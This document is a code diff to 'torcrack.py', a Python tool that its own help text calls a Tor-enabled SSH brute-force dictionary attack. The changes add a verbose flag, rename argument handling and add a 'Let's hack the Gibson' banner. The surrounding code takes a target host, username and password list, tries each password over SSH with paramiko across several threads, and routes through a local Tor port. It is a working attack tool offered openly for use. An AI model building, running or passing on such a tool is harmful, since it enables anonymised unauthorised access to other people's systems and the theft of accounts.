@@ -47,16 +47,18 @@ def exit_handler():
 
 
 def ssh_connect(password, code = 0):
-	global running
+	global running, verbose
 	paramiko.util.log_to_file(".logs/paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	print(' [*] Testing password: ' + password)
+	if verbose == True:
+		print(' [*] Testing password: ' + password)
 	try:
 		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
 	except paramiko.AuthenticationException:
 		running -= 1
-		print(' [-] Password ' + password + ' incorrect.')
+		if verbose == True:
+			print(' [-] Password ' + password + ' incorrect.')
 		return running
 	except socket.error as e:
 		print(' [-] Socket error. ')
@@ -85,40 +87,41 @@ def is_valid_ipv4(address):
 def main():
 	if not os.path.exists("./.logs"):
 		os.makedirs("./.logs")
-	global running
-	running = 0
 	atexit.register(exit_handler)
 	parser = argparse.ArgumentParser(prog='torcrack.py', description='Tor-enabled SSH brute force dictionary attack.')
 	parser.add_argument('tgtHost', type=str, help='target machine')
 	parser.add_argument('-t', '--tgtPort', type=int, help='port to attack on target machine (optional: default 22)', default=22)
 	parser.add_argument('tgtUser', type=str, help='target username')
 	parser.add_argument('dictFile', type=str, help='dictionary file or password list to use')
-	parser.add_argument('-m', '--max-threads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 10)', default=4)
+	parser.add_argument('-m', '--maxThreads', type=int, help='maximum number of threads (optional: default is 4,  maximum is 10)', default=4)
 	parser.add_argument('-P', '--torPort', type=int, help='local Tor port (optional: default 9050)', default=9050)
+	parser.add_argument('-v', '--verbose', action="store_true", help='display status at each step')
 	args = parser.parse_args()
-	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads
-	tgtUser = options.tgtUser
-	dictFile = options.dictFile
-	tgtPort = options.tgtPort
-	if is_valid_ipv4(options.tgtHost) == True:
-		tgtHost = options.tgtHost
+	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads, verbose, running
+	running = 0
+	tgtUser = args.tgtUser
+	dictFile = args.dictFile
+	tgtPort = args.tgtPort
+	verbose = args.verbose
+	if is_valid_ipv4(args.tgtHost) == True:
+		tgtHost = args.tgtHost
 	else:
 		try:
-			tgtHost = gethostbyname(options.tgtHost)
+			tgtHost = gethostbyname(args.tgtHost)
 		except:
-			print(" [-] Cannot resolve '%s': Unknown host\n" % options.tgtHost)
+			print(" [-] Cannot resolve '%s': Unknown host\n" % args.tgtHost)
 			exit(0)
-	torPort = options.torPort
-	if (options.maxThreads > 10):
+	torPort = args.torPort
+	if (args.maxThreads > 10):
 		print(' [-] Maximum number of threads can not exceed 10.')
 		maxThreads = 10
-	elif (options.maxThreads < 1):
+	elif (args.maxThreads < 1):
 		print(' [-] Maximum number of threads must be greater than 0 (come on, now.)')
 		maxThreads = 4
 	else:
-		maxThreads = options.maxThreads
+		maxThreads = args.maxThreads
 	print(' [+] Max Threads set to ' + str(maxThreads))
-	print(' [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
+	print(' [+] ' + args.tgtHost + ' resolved to ' + str(tgtHost))
 	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
 	print(' [+] Tor Port set to: ' + str(torPort))
 	print(' [+] Target username set to: ' + tgtUser)
@@ -147,6 +150,7 @@ def main():
 	for j in input_file.readlines():
 		password = j.strip('\n')
 		q.put(password)
+	print("\n [+] Let's hack the Gibson.\n")
 	while (q.qsize() > 0):
 		if running < maxThreads:
 			running += 1
